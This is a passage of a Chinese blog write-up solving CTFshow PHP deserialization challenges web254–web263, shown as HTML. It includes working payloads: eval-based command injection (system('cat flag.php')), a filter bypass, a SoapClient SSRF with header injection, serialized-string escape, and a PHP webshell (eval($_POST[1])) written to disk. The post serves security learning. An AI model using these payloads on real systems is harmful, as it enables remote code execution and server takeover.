<!-- build time:Fri Jul 14 2023 17:04:01 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="php反序列化"><link rel="canonical" href="https://blog.xcu.icu/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><title>CTFshow-web入门php反序列化 - CTFshow | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CTFshow-web入门php反序列化</h1><div class="meta"><span class="item" title="创建时间：2023-03-05 12:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-03-05T12:00:00+08:00">2023-03-05</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>20k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>18 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/13.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/15.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/133.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/3.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/46.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTFshow/" itemprop="item" rel="index" title="分类于 CTFshow"><span itemprop="name">CTFshow</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇记录反序列化的学习，有关知识点可以看我的这篇文章<a href="https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化 - Web | ClownのBlog &#x3D; (xcu.icu)</a></p><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><pre><code class="php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

class ctfShowUser&#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=false;

    public function checkVip()&#123;
        return $this-&gt;isVip;
    &#125;
    public function login($u,$p)&#123;
        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;
            $this-&gt;isVip=true;
        &#125;
        return $this-&gt;isVip;
    &#125;
    public function vipOneKeyGetFlag()&#123;
        if($this-&gt;isVip)&#123;
            global $flag;
            echo &quot;your flag is &quot;.$flag;
        &#125;else&#123;
            echo &quot;no vip, no flag&quot;;
        &#125;
    &#125;
&#125;

$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];

if(isset($username) &amp;&amp; isset($password))&#123;
    $user = new ctfShowUser();
    if($user-&gt;login($username,$password))&#123;
        if($user-&gt;checkVip())&#123;
            $user-&gt;vipOneKeyGetFlag();
        &#125;
    &#125;else&#123;
        echo &quot;no vip,no flag&quot;;
    &#125;
&#125;
</code></pre><p>这题emmm感觉不想是反序列化啊，就审计一下</p><pre><code class="php">?username=xxxxxx&amp;password=xxxxxx
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301201449519.png" alt="image-20230301201449519"></p><p>这里简单说一下逻辑，先看下面，$username和$password先接受get的参数，然后if判断差数是否存在，如果存在就实例化类ctfshowUser，然后调用类中的login方法判断用户名和密码是否正确正确给$isVip赋值为ture，接着调用checkVip函数检测上一步有没有通过（有点怪），最后调用vipOneKeyGetFlag函数输出flag（因为后面的题是这个的改动，所以这个稍微写的详细一点）</p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><pre><code class="php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

class ctfShowUser&#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=false;

    public function checkVip()&#123;
        return $this-&gt;isVip;
    &#125;
    public function login($u,$p)&#123;
        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
    &#125;
    public function vipOneKeyGetFlag()&#123;
        if($this-&gt;isVip)&#123;
            global $flag;
            echo &quot;your flag is &quot;.$flag;
        &#125;else&#123;
            echo &quot;no vip, no flag&quot;;
        &#125;
    &#125;
&#125;

$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];

if(isset($username) &amp;&amp; isset($password))&#123;
    $user = unserialize($_COOKIE[&#39;user&#39;]);    
    if($user-&gt;login($username,$password))&#123;
        if($user-&gt;checkVip())&#123;
            $user-&gt;vipOneKeyGetFlag();
        &#125;
    &#125;else&#123;
        echo &quot;no vip,no flag&quot;;
    &#125;
&#125;
</code></pre><p>这里多了一个cookie被反序列化很明显了，利用这个给isvip赋值就可以了</p><pre><code class="php">&lt;?php

class ctfShowUser&#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=true;
&#125;
$a = new ctfShowUser();
echo urlencode(serialize($a));
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301203023324.png" alt="image-20230301203023324"></p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><pre><code class="php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

class ctfShowUser&#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=false;

    public function checkVip()&#123;
        return $this-&gt;isVip;
    &#125;
    public function login($u,$p)&#123;
        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
    &#125;
    public function vipOneKeyGetFlag()&#123;
        if($this-&gt;isVip)&#123;
            global $flag;
            if($this-&gt;username!==$this-&gt;password)&#123;
                    echo &quot;your flag is &quot;.$flag;
              &#125;
        &#125;else&#123;
            echo &quot;no vip, no flag&quot;;
        &#125;
    &#125;
&#125;

$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];

if(isset($username) &amp;&amp; isset($password))&#123;
    $user = unserialize($_COOKIE[&#39;user&#39;]);    
    if($user-&gt;login($username,$password))&#123;
        if($user-&gt;checkVip())&#123;
            $user-&gt;vipOneKeyGetFlag();
        &#125;
    &#125;else&#123;
        echo &quot;no vip,no flag&quot;;
    &#125;
&#125;
</code></pre><p>这里有加上了一条username和pasword的不同</p><p>简单改一下上一题的payload就可以直接用</p><pre><code class="php">&lt;?php

class ctfShowUser&#123;
    public $username=&#39;demo&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=true;
&#125;
$a = new ctfShowUser();
echo urlencode(serialize($a));
//O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22demo%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302191137410.png" alt="image-20230302191137410"></p><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><pre><code class="php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser&#123;
    private $username=&#39;xxxxxx&#39;;
    private $password=&#39;xxxxxx&#39;;
    private $isVip=false;
    private $class = &#39;info&#39;;

    public function __construct()&#123;
        $this-&gt;class=new info();
    &#125;
    public function login($u,$p)&#123;
        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
    &#125;
    public function __destruct()&#123;
        $this-&gt;class-&gt;getInfo();
    &#125;

&#125;

class info&#123;
    private $user=&#39;xxxxxx&#39;;
    public function getInfo()&#123;
        return $this-&gt;user;
    &#125;
&#125;

class backDoor&#123;
    private $code;
    public function getInfo()&#123;
        eval($this-&gt;code);
    &#125;
&#125;

$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];

if(isset($username) &amp;&amp; isset($password))&#123;
    $user = unserialize($_COOKIE[&#39;user&#39;]);
    $user-&gt;login($username,$password);
&#125;
</code></pre><p>这里的利用思路是在ctfShowUser里有一个__destruct的方法会在对象销毁的时候会自动调用函数getInfo()，而在backDoor类中也有这个方法，而且会执行eval函数，这里我们需要覆盖这个__construct方法</p><pre><code class="php">&lt;?php
class ctfShowUser&#123;
    public function __construct()&#123;
        $this-&gt;class=new backDoor();
    &#125;
&#125;

class backDoor&#123;
    private $code=&quot;system(&#39;cat flag.php&#39;);&quot;;
&#125;
$a=new ctfShowUser();
echo serialize($a);
echo &quot;\n&quot;;
echo urlencode(serialize($a));
/*
O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:14:&quot; backDoor code&quot;;s:23:&quot;system(&#39;cat flag.php&#39;);&quot;;&#125;&#125;
O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D
*/
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302195845419.png" alt="image-20230302195845419"></p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><pre><code class="php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser&#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=false;
    public $class = &#39;info&#39;;

    public function __construct()&#123;
        $this-&gt;class=new info();
    &#125;
    public function login($u,$p)&#123;
        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
    &#125;
    public function __destruct()&#123;
        $this-&gt;class-&gt;getInfo();
    &#125;

&#125;

class info&#123;
    public $user=&#39;xxxxxx&#39;;
    public function getInfo()&#123;
        return $this-&gt;user;
    &#125;
&#125;

class backDoor&#123;
    public $code;
    public function getInfo()&#123;
        eval($this-&gt;code);
    &#125;
&#125;

$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];

if(isset($username) &amp;&amp; isset($password))&#123;
    if(!preg_match(&#39;/[oc]:\d+:/i&#39;, $_COOKIE[&#39;user&#39;]))&#123;
        $user = unserialize($_COOKIE[&#39;user&#39;]);
    &#125;
    $user-&gt;login($username,$password);
&#125;
</code></pre><p>这个题比起上面加上了过滤</p><pre><code>/[oc]:\d+:/i`。意思是过滤这两种情况：`o:数字:`与`c:数字:
</code></pre><p>加上一个+绕过即可</p><pre><code class="php">&lt;?php
class ctfShowUser&#123;
    public function __construct()&#123;
        $this-&gt;class=new backDoor();
    &#125;
&#125;

class backDoor&#123;
    public $code=&quot;system(&#39;cat flag.php&#39;);&quot;;
&#125;
$a=new ctfShowUser();
$a=serialize($a);
//echo &quot;\n&quot;;
$a = str_replace(&#39;O:&#39;,&#39;O:+&#39;,$a);
//echo &quot;\n&quot;;
echo urlencode($a);
//O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302203124133.png" alt="image-20230302203124133"></p><h2 id="web259-SocapClient"><a href="#web259-SocapClient" class="headerlink" title="web259-SocapClient"></a>web259-SocapClient</h2><pre><code class="php">&lt;?php

highlight_file(__FILE__);


$vip = unserialize($_GET[&#39;vip&#39;]);
//vip can get flag one key
$vip-&gt;getFlag();
</code></pre><p>这里就一个反序列化，然后就调用getflag函数，可以想到是原生类的使用，__call()函数，是当调用未知函数时自动触发，而在SocapClient原生类中会有call函数可以进行SSRF</p><p>这里给的的flag.php</p><pre><code class="php">$xff = explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);
array_pop($xff);
$ip = array_pop($xff);


if($ip!==&#39;127.0.0.1&#39;)&#123;
    die(&#39;error&#39;);
&#125;else&#123;
    $token = $_POST[&#39;token&#39;];
    if($token==&#39;ctfshow&#39;)&#123;
        file_put_contents(&#39;flag.txt&#39;,$flag);
    &#125;
&#125;
</code></pre><p>这里限制了ip为127.0.0.1</p><p>$_SERVER[‘HTTP_X_FORWARDED_FOR’]要array_pop两次,取第二次的值赋值给$IP,post传入的token如果&#x3D;&#x3D;&#x3D;ctfshow就会把$flag的值写入flag.txt里面</p><pre><code class="php">&lt;?php
$ua=&quot;ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;;
$client=new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;127.0.0.1/&quot;,&#39;location&#39;=&gt;&quot;http://127.0.0.1/flag.php&quot;,&#39;user_agent&#39;=&gt;$ua));
echo urlencode(serialize($client));
//O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A132%3A%22kradress%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
</code></pre><p>访问flag.txt查看flag</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302221314104.png" alt="image-20230302221314104"></p><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><pre><code class="php">&lt;?php

error_reporting(0);
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

if(preg_match(&#39;/ctfshow_i_love_36D/&#39;,serialize($_GET[&#39;ctfshow&#39;])))&#123;
    echo $flag;
&#125;
</code></pre><p>看到题我还懵了一下，属实没想到，上一题还在SSRF，下一题又随便传个参就过了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304111406708.png" alt="image-20230304111406708"></p><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><pre><code class="php">&lt;?php

highlight_file(__FILE__);

class ctfshowvip&#123;
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p)&#123;
        $this-&gt;username=$u;
        $this-&gt;password=$p;
    &#125;
    public function __wakeup()&#123;
        if($this-&gt;username!=&#39;&#39; || $this-&gt;password!=&#39;&#39;)&#123;
            die(&#39;error&#39;);
        &#125;
    &#125;
    public function __invoke()&#123;
        eval($this-&gt;code);
    &#125;

    public function __sleep()&#123;
        $this-&gt;username=&#39;&#39;;
        $this-&gt;password=&#39;&#39;;
    &#125;
    public function __unserialize($data)&#123;
        $this-&gt;username=$data[&#39;username&#39;];
        $this-&gt;password=$data[&#39;password&#39;];
        $this-&gt;code = $this-&gt;username.$this-&gt;password;
    &#125;
    public function __destruct()&#123;
        if($this-&gt;code==0x36d)&#123;
            file_put_contents($this-&gt;username, $this-&gt;password);
        &#125;
    &#125;
&#125;

unserialize($_GET[&#39;vip&#39;]);
</code></pre><p>这一题稍微有点意思，但不多，首先简单说一下上面用到几个方法</p><pre><code class="perl">__construct():构造函数，类实例化时自动调用
__invoke():调用函数的方式调用一个对象时的回应方法
__wakeu():反序列化后自动调用
__sleep():序列化时会自动调用
 __unserialize():在unserialize函数执行前会先检查有无此函数，如果又，优先级最高
 __destruct():在类的一个对象被删除时自动调用
</code></pre><p>整个程序执行时，先进__unserialize函数，但是在__unserialize函数中没有能够进入__invoke函数的方法，这里只能通过在对象被删除时制动调用__destruct来写文件，故这里只需要满足code为0x36d&#x3D;877即可</p><pre><code class="php">&lt;?php
class ctfshowvip&#123;
    public $username=&quot;877.php&quot;;
    public $password=&#39;&lt;?php eval($_POST[1]);&#39;;
    public $code=0x36d;
&#125;
$a =new ctfshowvip();
echo serialize($a).&quot;\n&quot;;
echo urlencode(serialize($a));
</code></pre><p>这里写入一个文件，用蚁剑连接</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304115732681.png" alt="image-20230304115732681"></p><h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><p>index.php</p><pre><code class="php"> &lt;?php
error_reporting(0);
class message&#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#39;user&#39;;
    public function __construct($f,$m,$t)&#123;
        $this-&gt;from = $f;
        $this-&gt;msg = $m;
        $this-&gt;to = $t;
    &#125;
&#125;

$f = $_GET[&#39;f&#39;];
$m = $_GET[&#39;m&#39;];
$t = $_GET[&#39;t&#39;];

if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;
    $msg = new message($f,$m,$t);
    $umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));
    setcookie(&#39;msg&#39;,base64_encode($umsg));
    echo &#39;Your message has been sent&#39;;
&#125;

highlight_file(__FILE__);
</code></pre><p>message.php</p><pre><code class="php">&lt;?php
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

class message&#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#39;user&#39;;
    public function __construct($f,$m,$t)&#123;
        $this-&gt;from = $f;
        $this-&gt;msg = $m;
        $this-&gt;to = $t;
    &#125;
&#125;

if(isset($_COOKIE[&#39;msg&#39;]))&#123;
    $msg = unserialize(base64_decode($_COOKIE[&#39;msg&#39;]));
    if($msg-&gt;token==&#39;admin&#39;)&#123;
        echo $flag;
    &#125;
&#125;
</code></pre><p>有替换很明显，考察字符串逃逸，这里先简单说一下什么是字符串逃逸</p><h3 id="反序列化字符串逃逸"><a href="#反序列化字符串逃逸" class="headerlink" title="反序列化字符串逃逸"></a>反序列化字符串逃逸</h3><h4 id="增加"><a href="#增加" class="headerlink" title="增加"></a>增加</h4><p>这个点在我上面的文章中没有说到，当时没想起来还有这个点，这个知识点也不麻烦，就简单的说明一下</p><p>php序列化后的格式是固定的</p><pre><code class="php">&lt;?php
class demo&#123;
    public $username = &quot;admin&quot;;
    public $passwd=&quot;test&quot;;
&#125;
$a = new demo();
echo $b = serialize($a).&quot;\n&quot;;

var_dump(unserialize($b));
var_dump(unserialize(&quot;O:4:\&quot;demo\&quot;:2:&#123;s:8:\&quot;username\&quot;;s:5:\&quot;admin\&quot;;s:6:\&quot;passwd\&quot;;s:4:\&quot;test\&quot;;&#125;aaaaaaaaaaaaaaaaaaaaaaaa&quot;));
var_dump(unserialize(&quot;O:4:\&quot;demo\&quot;:2:&#123;s:8:\&quot;username123\&quot;;s:5:\&quot;admin\&quot;;s:6:\&quot;passwd\&quot;;s:4:\&quot;test\&quot;;&#125;&quot;));
?&gt;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304134324287.png" alt="image-20230304134324287"></p><p>这里把下面的username加上了123，这里长度与前面的8不对应就报错,后面加上的aaaaaaaa不影响反序列化的结果</p><p>为什么上面说有替换猜测是字符串逃逸呢？</p><p>这里假如我需要更改passwd为admin，不去改动$passwd怎么做到呢？</p><pre><code class="php">&lt;?php
class demo&#123;
    public $username = &quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\&quot;;s:6:\&quot;passwd\&quot;;s:5:\&quot;admin\&quot;;&#125;&quot;;
    public $passwd=&quot;test&quot;;
&#125;
$a = new demo();
echo $b = serialize($a).&quot;\n&quot;;
echo $c= str_replace(&#39;fuck&#39;, &#39;loveU&#39;,$b).&quot;\n&quot;;
var_dump(unserialize($c));


?&gt;
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304133733733.png" alt="image-20230304133733733"></p><p>看上面的结果，这里passwd已经被改为了admin，很简单的逻辑，在前一个变量后面添加上&quot;;s:6:&quot;passwd&quot;;s:5:&quot;admin&quot;;},这是我们构造的passwd预取为admin的序列化后的结果，通过</p><pre><code class="php">str_replace(&#39;fuck&#39;, &#39;loveU&#39;,$b).&quot;\n&quot;;
</code></pre><p>这一句会讲fuck替换为loveU，每有一个fuck就会使得前一个变量的长度加一，当我们长度等于我们构造的&quot;;s:6:&quot;passwd&quot;;s:5:&quot;admin&quot;;}，这里就会顶替掉原有的&quot;;s:6:&quot;passwd&quot;;s:4:&quot;test &quot;;}</p><h4 id="减少"><a href="#减少" class="headerlink" title="减少"></a>减少</h4><p>原理还是跟增加得到一样，不过是我们构造的字符添加的位置不同</p><pre><code class="php">&lt;?php
class demo&#123;
    public $username = &quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;
    public $passwd=&quot;test&quot;;
&#125;
$a = new demo();
echo $b = serialize($a);
$c= str_replace(&#39;fuck&#39;, &#39;you&#39;,$b).&quot;\n&quot;;
echo $c;
$d=$c.&quot;\&quot;;s:6:\&quot;passwd\&quot;;s:5:\&quot;admin\&quot;;&#125;&quot;;
echo $d.&quot;\n&quot;;
var_dump(unserialize($d));
echo strlen(&quot;youyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyou\&quot;;s:6:\&quot;passwd\&quot;;s:5:\&quot;admin\&quot;;&#125;&quot;);
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304135322961.png" alt="image-20230304135322961"></p><p>现在做这个就简单了</p><pre><code class="php">&lt;?php
class message&#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#39;admin&#39;;
    public function __construct($f,$m,$t)&#123;
        $this-&gt;from = $f;
        $this-&gt;msg = $m;
        $this-&gt;to = $t;
    &#125;
&#125;
$f = &quot;1&quot;;
$m = &quot;1&quot;;
$t = &quot;1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\&quot;;s:5:\&quot;token\&quot;;s:5:\&quot;admin\&quot;;&#125;&quot;;
$a = new message($f,$m,$t);

echo serialize($a).&quot;\n&quot;;
echo base64_encode(str_replace(&#39;fuck&#39;, &#39;loveU&#39;,serialize($a))).&quot;\n&quot;;
echo urlencode(serialize($a)).&quot;\n&quot;;
echo strlen(&quot;1loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;);
/*
O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:136:&quot;1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;
Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxMzY6IjFsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVUiO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30iO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30=
O%3A7%3A%22message%22%3A4%3A%7Bs%3A4%3A%22from%22%3Bs%3A1%3A%221%22%3Bs%3A3%3A%22msg%22%3Bs%3A1%3A%221%22%3Bs%3A2%3A%22to%22%3Bs%3A136%3A%221fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D
136
*/
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304125625217.png" alt="image-20230304125625217"></p><h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>这题考察的是Session反序列化，扫描目录能拿到<span class="exturl" data-url="aHR0cDovL3d3dy56aXDmlofku7Yv">www.zip文件</span></p><p>首先是index.php文件</p><pre><code class="php">&lt;?php
error_reporting(0);
session_start();
//超过5次禁止登陆
if (isset($_SESSION[&#39;limit&#39;])) &#123;
    $_SESSION[&#39;limti&#39;] &gt; 5 ? die(&quot;登陆失败次数超过限制&quot;) : $_SESSION[&#39;limit&#39;] = base64_decode($_COOKIE[&#39;limit&#39;]);
    $_COOKIE[&#39;limit&#39;] = base64_encode(base64_decode($_COOKIE[&#39;limit&#39;]) + 1);
&#125; else &#123;
    setcookie(&quot;limit&quot;, base64_encode(&#39;1&#39;));
    $_SESSION[&#39;limit&#39;] = 1;
&#125;
</code></pre><p><code>$_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;])</code>来控制session的值</p><p>在inc.php文件中，首先这里把session.serialize_handler设置为了php,和index.php不一致，可以利用来进行反序列化</p><pre><code class="php">&lt;?php
error_reporting(0);
ini_set(&#39;display_errors&#39;, 0);
ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);

date_default_timezone_set(&quot;Asia/Shanghai&quot;);
session_start();
use \CTFSHOW\CTFSHOW; 
require_once &#39;CTFSHOW.php&#39;;
$db = new CTFSHOW([
    &#39;database_type&#39; =&gt; &#39;mysql&#39;,
